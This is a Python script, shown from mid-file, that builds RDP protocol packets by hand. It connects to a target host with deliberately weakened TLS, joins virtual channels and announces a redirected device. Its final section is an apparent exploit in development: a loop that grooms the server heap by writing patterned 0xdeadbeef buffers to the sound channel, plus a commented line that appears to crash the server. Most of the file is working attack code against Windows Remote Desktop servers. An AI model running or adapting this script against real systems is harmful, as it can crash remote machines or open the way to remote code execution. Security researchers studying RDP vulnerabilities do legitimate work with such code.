        self.DYNVC_CREATE_REQ       = 0x10 

class DVC_Init(DVCBase):
    structure = (
        ('pad','B=0'),
        ('Version','<H=0x2'),
    )

    def __init__(self,data=None):
        DVCBase.__init__(self,data)
        self['hdrBitmask'] = self.DYNVC_CMD_CAPABILITIES 

class DVC_CreateRequest(DVCBase):
    structure = (
        ('channelId','B=0'),
        ('channelName',':="')
    )

    def __init__(self,data=None):
        DVCBase.__init__(self,data)
        self['hdrBitmask'] =  self.DYNVC_CREATE_REQ
        self['channelName'] = b''

    def addChannel(self,channel,channel_name):
        self['channelId'] = channel
        self['channelName'] = channel_name + b'\x00'

##################################################
# MS-RDPEFS structures and functions
# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpefs/2a2435f4-f8a6-43a1-af9b-dddcf6b90e1a

class RDPEFS_Base(Structure):
    commonHdr = (
        ('CTYP_CORE','<H=0x4472'), # this appears to be constant across all PDUs? 
        ('PAKID','<H=0'), # this one seems to change a lot
    )

    def __init__(self,data=None):
        Structure.__init__(self,data)

class RDPEFS_Client_Announce_Reply(RDPEFS_Base):

    structure = (
        ('VersionMajor','<H=1'),
        ('VersionMinor','<H=0x000c'),
        ('ClientId','<L=2'), 
    )

    def __init__(self,data=None):
        logging.debug("RDPEFS - Client Announce Response")
        RDPEFS_Base.__init__(self,data)
        self['PAKID'] = 0x4343

class RDPEFS_Client_Name_Request(RDPEFS_Base):
    structure = (
        ('UnicodeFlag','<L=1'),
        ('CodePage','<L=0'),
        ('ComputerNameLen','<L=len(ComputerName)'),
        ('ComputerName',':=""')
    )

    def __init__(self,data=None):
        logging.debug("RDPEFS - Client Name Request")
        RDPEFS_Base.__init__(self,data)
        self['PAKID'] = 0x434e
        self['ComputerName'] = unpack("4400450053004b0054004f0050002d0039004d003200340052004f0050000000")

class RDPEFS_ClientCapabilityResponse(RDPEFS_Base):
    structure = (
        ('numCapabilities','<H=5'),
        ('padding','<H=0'),
        ('CapabilityType','<H=1'),
        ('CapabilityLength','<H=44'), # not sure how this is calculated; leave it hardcoded for now
        ('Version','<L=2'),
        ('osType','<L=2'),
        ('osVersion','<L=0'),
        ('protMajorVersion','<H=0x1'),
        ('protMinorVersion','<H=0xc'),
        ('ioCode1','<L=0xffff'),
        ('ioCode2','<L=0'),
        ('extendedPDU','<L=7'),
        ('extraFlags1','<L=0'),
        ('extraFlags2','<L=0'),
        ('specialTypeDeviceCap','<L=2'),
        ('capabilityTypePrint','<H=2'),
        ('capabilityLenPrint','<H=8'),
        ('capabilityVersPrint','<L=1'),
        ('capabilityTypePort','<H=3'),
        ('capabilityLenPort','<H=8'),
        ('capabilityVersPort','<L=1'),
        ('capabilityTypeDrive','<H=4'),
        ('capabilityLenDrive','<H=8'),
        ('capabilityVersDrive','<L=1'),
        ('capabilityTypeCard','<H=5'),
        ('capabilityLenCard','<H=8'),
        ('capabilityVersCard','<L=1'),
    )

    def __init__(self,data=None):
        RDPEFS_Base.__init__(self,data)
        self['PAKID'] = 0x4350

class RDPEFS_Client_Announce_Device_Req(RDPEFS_Base):
    # TODO: implement arbitrary device addition to this 
    structure = (
        ('DeviceCount','<L=1'),
        ('DeviceType1','<L=0x20'),
        ('DeviceId1','<L=1'),
        ('PreferredDosName1',':=""'),
        #('PrefereedDosNameCont1','<L=0'),
        ('DeviceDataLen1','<L=0'),
        #('DeviceType2','<L=8'),
        #('DeviceId2','<L=2'),
        #('PreferredDosName2','<L=0x3a44'),
        #('PrefereedDosNameCont2','<L=0'),
        #('DeviceDataLen2','<L=0'),
        #('DeviceType3','<L=8'),
        #('DeviceId3','<L=3'),
        #('PreferredDosName3','<L=0x3a43'),
        #('PrefereedDosNameCont3','<L=0'),
        #('DeviceDataLen3','<L=0'),
    )
    def __init__(self,data=None):
        logging.debug("RDPEFS - Client Announce Device Request")
        RDPEFS_Base.__init__(self,data)
        self['PAKID'] = 0x4441
        self['PreferredDosName1'] = unpack("5343415244000000")

#class RDPEFS_Client_Announce_Dev_List(RDPEFS_Base):
#
#    def __init__(self,data=None):
#        RDPEFS_Base.__init__(self,data)
#        self['PAKID'] = 0x4441


    

##################################################

def channel_join_request(s,channel, recv=True):
    # RDP Channel Join Request
    logging.debug("channel join request: {}".format(channel))
    tpkt = TPKT()
    tpdu = TPDU()
    t125 = T125()
    t125.channelJoinRequest(channel)
    tpdu.dataRequest(t125)
    tpkt['TPDU'] = tpdu.getData()
    s.sendall(tpkt.getData())
    if recv:
        #print("RECEIVING CHANNEL: " + str(channel))
        #time.sleep(1)
        pkt = s.recv(8192)

def negotiation_request(s):
    '''
    Initializes socket and sends the Client Negotiation request. 
    '''
    # Negotiation Request
    logging.debug("client negotiation request")

    tpkt = TPKT()
    tpdu = TPDU()
    tpdu.negRequest()
    tpkt['TPDU'] = tpdu.getData()
    s.sendall(tpkt.getData())
    pkt = s.recv(8192)

def init_client_data_request(tls):
    logging.debug("client connect initial PDU")
    tpkt = TPKT()
    tpdu = TPDU()
    t125 = T125ConnectInitial()
    t124 = T124()
    rdp = RDP()

    rdpCoreData = RDPClientData()
    rdpCoreData.createCoreData()

    rdpClusterData = RDPClientData()
    rdpClusterData.createClusterData()

    rdpSecurityData = RDPClientData()
    rdpSecurityData.createSecurityData()

    rdpNetworkData = RDPClientData()
    rdpNetworkData.createNetworkData()

    rdpMsgChannelData = RDPClientData()
    rdpMsgChannelData.createClientMsgChannelData()

    rdpMultiTransportData = RDPClientData()
    rdpMultiTransportData.createClientMultiTransportData()

    rdp.addClientData(rdpCoreData.getData())
    rdp.addClientData(rdpClusterData.getData())
    rdp.addClientData(rdpSecurityData.getData())
    rdp.addClientData(rdpNetworkData.getData())
    rdp.addClientData(rdpMsgChannelData.getData())
    rdp.addClientData(rdpMultiTransportData.getData())

    t124.addUserData(rdp.getData())
    t125.addUserData(t124.getData())
    tpdu.dataRequest(t125)
    tpkt['TPDU'] = tpdu.getData()
    tls.sendall(tpkt.getData())
    pkt = tls.recv(8192)
    server_cert = pkt.hex()[154*2:]

    return server_cert

def erect_domain_request(tls):
# RDP Client Erect Domain Request
    logging.debug("erect domain request PDU")
    tpkt = TPKT()
    tpdu = TPDU()
    t125 = T125()

    t125.erectDomainRequest()
    tpdu.dataRequest(t125)
    tpkt['TPDU'] = tpdu.getData()
    tls.sendall(tpkt.getData())

def attach_user_request(tls):
    logging.debug("attach user request PDU")
    # RDP Client Attach User Request
    tpkt = TPKT()
    tpdu = TPDU()
    t125 = T125()

    t125.attachUserRequest()
    tpdu.dataRequest(t125)
    tpkt['TPDU'] = tpdu.getData()
    tls.sendall(tpkt.getData())
    pkt = tls.recv(8192)

def client_info_pdu(tls):
    logging.debug("client info PDU")
    tpkt = TPKT()
    tpdu = TPDU()
    t125 = T125()

    clientInfo = ClientInfoPDU()
    data_request = T125DataRequest()
    data_request.setChannel(1003)
    data_request.setData(clientInfo.getData())

    t125.sendDataRequest(data_request.getData())

    tpdu.dataRequest(t125)
    tpkt['TPDU'] = tpdu.getData()
    tls.sendall(tpkt.getData())
    # error alert and demand client active PDU
    # could probably combine these? idk lol it just werks
    pkt = tls.recv(8192)
    pkt = tls.recv(8192)

def confirm_active_pdu(tls):
    logging.debug("confirm active PDU")
    tpkt = TPKT()
    tpdu = TPDU()
    t125 = T125()

    confirmPDU = ClientPDU()
    confirmPDU.confirmActivePDU()
    data_request = T125DataRequest()
    data_request.setChannel(1003)
    data_request.setData(confirmPDU.getData())

    t125.sendDataRequest(data_request.getData())

    tpdu.dataRequest(t125)
    tpkt['TPDU'] = tpdu.getData()
    tls.sendall(tpkt.getData())
    # shouldn't need this one here
    #pkt = tls.recv(8192)
    
def client_syncronize_pdu(tls):
    """
    TODO: is this broken?? 
    """

    logging.debug("client syncronize PDU")
    tpkt = TPKT()
    tpdu = TPDU()
    t125 = T125()

    syncPDU = ClientPDU()
    syncPDU.synchronizePDU()
    data_request = T125DataRequest()
    data_request.setChannel(1003)
    data_request.setData(syncPDU.getData())

    t125.sendDataRequest(data_request.getData())

    tpdu.dataRequest(t125)
    tpkt['TPDU'] = tpdu.getData()
    tls.sendall(tpkt.getData())
    #pkt = tls.recv(8192)
    
def client_cooperate_pdu(tls):
    logging.debug("client cooperate PDU")

    tpkt = TPKT()
    tpdu = TPDU()
    t125 = T125()

    coopPDU = ClientPDU()
    coopPDU.cooperatePDU()
    data_request = T125DataRequest()
    data_request.setChannel(1003)
    data_request.setData(coopPDU.getData())

    t125.sendDataRequest(data_request.getData())

    tpdu.dataRequest(t125)
    tpkt['TPDU'] = tpdu.getData()
    tls.sendall(tpkt.getData())

def client_control_pdu(tls):
    logging.debug("client control PDU")

    tpkt = TPKT()
    tpdu = TPDU()
    t125 = T125()

    controlPDU = ClientPDU()
    controlPDU.controlPDU()
    data_request = T125DataRequest()
    data_request.setChannel(1003)
    data_request.setData(controlPDU.getData())

    t125.sendDataRequest(data_request.getData())

    tpdu.dataRequest(t125)
    tpkt['TPDU'] = tpdu.getData()
    tls.sendall(tpkt.getData())

def keylist_pdu(tls):
    logging.debug("keylist PDU")

    tpkt = TPKT()
    tpdu = TPDU()
    t125 = T125()

    keylistPDU = ClientPDU()
    keylistPDU.keylistPDU()
    data_request = T125DataRequest()
    data_request.setChannel(1003)
    data_request.setData(keylistPDU.getData())
    t125.sendDataRequest(data_request.getData())
    tpdu.dataRequest(t125)
    tpkt['TPDU'] = tpdu.getData()
    tls.sendall(tpkt.getData())

def fontlist_pdu(tls):
    logging.debug("fontlist PDU")

    tpkt = TPKT()
    tpdu = TPDU()
    t125 = T125()

    fontlistPDU = ClientPDU()
    fontlistPDU.fontListPDU()
    # for some reason wireshark isn't picking up some of the FontList Attrs we want, try adjusting size? 
    #fontlistPDU['totalLength'] = 26
    data_request = T125DataRequest()
    data_request.setChannel(1003)
    data_request.setData(fontlistPDU.getData())
    t125.sendDataRequest(data_request.getData())
    tpdu.dataRequest(t125)
    tpkt['TPDU'] = tpdu.getData()
    tls.sendall(tpkt.getData())

def dynvc_response(tls,channel):
    logging.debug("dynvc response on channel: {}".format(channel))
    tpkt = TPKT()
    tpdu = TPDU()
    t125 = T125()
    vcPDU = VirtualChannelPDU()

    dvc = DVC_Init()
    vcPDU.setPDU(dvc.getData())
    # for some reason wireshark isn't picking up some of the FontList Attrs we want, try adjusting size? 
    #fontlistPDU['totalLength'] = 26
    data_request = T125DataRequest()
    data_request.setChannel(channel)
    data_request.setData(vcPDU.getData())
    data_request['initiator'] = 3
    t125.sendDataRequest(data_request.getData())
    tpdu.dataRequest(t125)
    tpkt['TPDU'] = tpdu.getData()

    tls.sendall(tpkt.getData())

def dynvc_create_request(tls,static_channel,channelId,channelName):
    logging.debug("dynvc create request -- \n\tstatic channel id: {}\n\tdynamic channel id: {}\n\tchannel name {}"
        .format(static_channel,channelId,channelName) )
    tpkt = TPKT()
    tpdu = TPDU()
    t125 = T125()
    vcPDU = VirtualChannelPDU()

    dvc = DVC_CreateRequest()
    dvc.addChannel(channelId,channelName)
    vcPDU.setPDU(dvc.getData())
    data_request = T125DataRequest()
    data_request.setChannel(static_channel)
    data_request.setData(vcPDU.getData())
    data_request['initiator'] = 3
    t125.sendDataRequest(data_request.getData())
    tpdu.dataRequest(t125)
    tpkt['TPDU'] = tpdu.getData()

    tls.sendall(tpkt.getData())

def rdpefs_client_announce_reply(tls):
    logging.debug("RDPEFS client announce response")
    tpkt = TPKT()
    tpdu = TPDU()
    t125 = T125()
    vcPDU = VirtualChannelPDU()

    efs = RDPEFS_Client_Announce_Reply()
    vcPDU.setPDU(efs.getData())
    data_request = T125DataRequest()
    data_request.setChannel(1004)
    data_request.setData(vcPDU.getData())
    t125.sendDataRequest(data_request.getData())
    tpdu.dataRequest(t125)
    tpkt['TPDU'] = tpdu.getData()

    tls.sendall(tpkt.getData())

def rdpefs_client_name_request(tls):
    logging.debug("RDPEFS client name request")
    tpkt = TPKT()
    tpdu = TPDU()
    t125 = T125()
    vcPDU = VirtualChannelPDU()

    efs = RDPEFS_Client_Name_Request()
    vcPDU.setPDU(efs.getData())
    data_request = T125DataRequest()
    data_request.setChannel(1004)
    data_request.setData(vcPDU.getData())
    t125.sendDataRequest(data_request.getData())
    tpdu.dataRequest(t125)
    tpkt['TPDU'] = tpdu.getData()

    tls.sendall(tpkt.getData())

def rdpefs_client_capability_response(tls):
    logging.debug("RDPEFS client capability response")
    tpkt = TPKT()
    tpdu = TPDU()
    t125 = T125()
    vcPDU = VirtualChannelPDU()

    efs = RDPEFS_ClientCapabilityResponse()
    vcPDU.setPDU(efs.getData())
    data_request = T125DataRequest()
    data_request.setChannel(1004)
    data_request.setData(vcPDU.getData())
    t125.sendDataRequest(data_request.getData())
    tpdu.dataRequest(t125)
    tpkt['TPDU'] = tpdu.getData()

    tls.sendall(tpkt.getData())

def rdpefs_client_announce_device_req(tls):
    logging.debug("RDPEFS client announce device request")
    tpkt = TPKT()
    tpdu = TPDU()
    t125 = T125()
    vcPDU = VirtualChannelPDU()

    efs = RDPEFS_Client_Announce_Device_Req()
    vcPDU.setPDU(efs.getData())
    data_request = T125DataRequest()
    data_request.setChannel(1004)
    data_request.setData(vcPDU.getData())
    t125.sendDataRequest(data_request.getData())
    tpdu.dataRequest(t125)
    tpkt['TPDU'] = tpdu.getData()

    tls.sendall(tpkt.getData())

def fp_keyboard_event(tls,key):
    logging.debug("FP keyboard event -- key: {}".format(key))
    event = FPInputPDU()
    event.addKeyBoardEvent(key)
    tls.sendall(event.getData())

def fp_mouse_event(tls,xPos,yPos):
    logging.debug("FP mouse event -- xPos {}, yPos {}".format(xPos,yPos))
    event = FPInputPDU()
    event.addMouseEvent(xPos,yPos)
    tls.sendall(event.getData())

def client_shutdown_request(tls):
    logging.info("client_shutdown_request")
    tpkt = TPKT()
    tpdu = TPDU()
    t125 = T125()
    shutdownPDU = ShutdownRequestPDU()

    data_request = T125DataRequest()
    data_request.setChannel(1003)
    data_request.setData(shutdownPDU.getData())
    t125.sendDataRequest(data_request.getData())
    tpdu.dataRequest(t125)
    tpkt['TPDU'] = tpdu.getData()

    tls.sendall(tpkt.getData())
    data = tls.recv(8192)
    data = tls.recv(8192)

def write_virtual_channel(tls,channelId,data):
    logging.info(" +++ WRITING DATA TO CHANNEL: {}".format(channelId))
    tpkt = TPKT()
    tpdu = TPDU()
    t125 = T125()
    dataPDU = ChannelPDU()
    dataPDU.setData(data)

    data_request = T125DataRequest()
    data_request.setChannel(channelId)
    data_request.setData(dataPDU.getData())
    t125.sendDataRequest(data_request.getData())
    tpdu.dataRequest(t125)
    tpkt['TPDU'] = tpdu.getData()

    tls.sendall(tpkt.getData())

#s = socket.socket()

if len(sys.argv) > 1:
    logging.info("Using args for host and port")
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])

logging.debug("initial socket to {}:{}".format(HOST,PORT))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST,PORT))

negotiation_request(s)

# forced the OS to use shitty old cipher suites that don't support
# forward secrecy and stuff; now we can use WireShark to read traffic
# there's probably a better way to do this and idk what i'm doing lol 
logging.debug("switching to TLS")
ctx = SSL.Context(SSL.TLSv1_METHOD)
ctx.set_cipher_list(b'AES128-SHA')
tls = SSL.Connection(ctx, s)
tls.set_connect_state()
tls.do_handshake()

init_client_data_request(tls)
erect_domain_request(tls)
attach_user_request(tls)
channel_join_request(tls,1003)
channel_join_request(tls,1004)
channel_join_request(tls,1005)
channel_join_request(tls,1006)
channel_join_request(tls,1007)
channel_join_request(tls,1008)

client_info_pdu(tls)

confirm_active_pdu(tls) 
client_syncronize_pdu(tls) 
time.sleep(1)
client_cooperate_pdu(tls)
time.sleep(1)
client_control_pdu(tls)
time.sleep(1)
keylist_pdu(tls)
fontlist_pdu(tls)

# get huge blob of font data and any virtual channel data from server
for i in range(24):
    tls.recv(65535)
tls.recv(8192)

time.sleep(1)
rdpefs_client_announce_reply(tls)
time.sleep(1)
rdpefs_client_name_request(tls)
time.sleep(1.0)
tls.recv(8192)
tls.recv(8192)
rdpefs_client_capability_response(tls)
rdpefs_client_announce_device_req(tls)

time.sleep(1)

# this kills the crab
#write_virtual_channel(tls, 1007,unpack("0100000002000000"))

# grooming
for j in range(0,10):
    print("WRITING TO CHANNEL: 1005")
    #write_virtual_channel(tls, 1005,'A'*0xa8) # write to RDPSND to groom
    #write_virtual_channel(tls, 1005,'\xde\xad\xbe\xef'*int(0xa8/4)) # write to RDPSND to groom
    write_virtual_channel(tls, 1005,'\xef\xbe\xad\xde'*int(0xa8/4)) # write to RDPSND to groom
    time.sleep(2)

time.sleep(4)
client_shutdown_request(tls)
sys.exit(0)

fp_keyboard_event(tls,0x41)
fp_keyboard_event(tls,0x41)
fp_keyboard_event(tls,0x41)
fp_keyboard_event(tls,0x41)
fp_mouse_event(tls,0,0)
fp_mouse_event(tls,69,420)
tls.recv(8192)
tls.recv(8192)
tls.recv(8192)
tls.recv(8192)
tls.recv(8192)